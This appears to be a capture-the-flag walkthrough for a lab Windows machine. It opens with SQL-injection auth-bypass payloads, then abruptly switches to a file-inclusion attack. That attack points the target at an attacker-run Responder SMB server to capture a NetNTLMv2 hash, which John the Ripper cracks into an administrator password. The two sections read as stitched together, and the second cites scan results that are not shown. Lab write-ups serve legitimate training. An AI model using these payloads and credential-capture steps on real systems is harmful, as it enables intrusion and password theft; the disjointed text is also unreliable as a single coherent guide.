SQL Injection (sqli) is a technique used to inject SQL commands via the front end to leak information from the database.\nIt’s worth trying a few basic sqli before breaking out the big guns like sqlmap. Let’s try a few from this Github I found Googling “sqli payloads”. Let’s go to the section of sqli payloads for bypassing authentication (Auth Bypass Payloads) – they usually have a format similar to ' OR 1=1 or admin' --.

From our nmap, we know that the server hosting this page is a Windows machine. So, in order for us to test this RFI vulnerability, we will first need to learn a bit about NTLM.\nNTLM NTLM (New Technology Lan Manager) is essentially a network security manager in Windows that provides authentication, integrity, and confidentiality. Notably, it is a single sign-on (SSO) which allows requires users to only be authenticated once. More details of NTLM and the authentication process can be found on Crowdstrike. Basically, there are tools — such as Responder — which allow us to listen in on the NTLM authentication and capture the NetNTLMv2 hash. If we are able to crack this hash, we can then gain access to the server. Let’s give it a go.\nResponder Responder (git clone https://github.com/lgandx/Responder), is a tool that can simulate many attacks. In this case, we will use it as a malicious SMB server to capture the NetNTLMv2 hash. This can be done by:\nsudo python3 Responder.py -I tun0 Now we will have the server interact with this SMB server (hosted on your client IP — mine being 10.10.14.165) by changing the URL in our browser to:\nhttp://unika.htb/index.php?page=//10.10.14.165/any_file_name\nHash acquired!\nWe just need to crack it.\njohn the ripper john (john the ripper) is one commonly used hash cracking tools. Let’s copy this hash from Responder and throw it into a text file such as hashed.txt. Let john do the rest:\n$ john -w=/usr/share/wordlists/rockyou.txt hashed.txt Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status badminton (Administrator) 1g 0:00:00:00 DONE (2022-10-25 23:58) 100.0g/s 409600p/s 409600c/s 409600C/s slimshady..oooooo Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably Session completed.
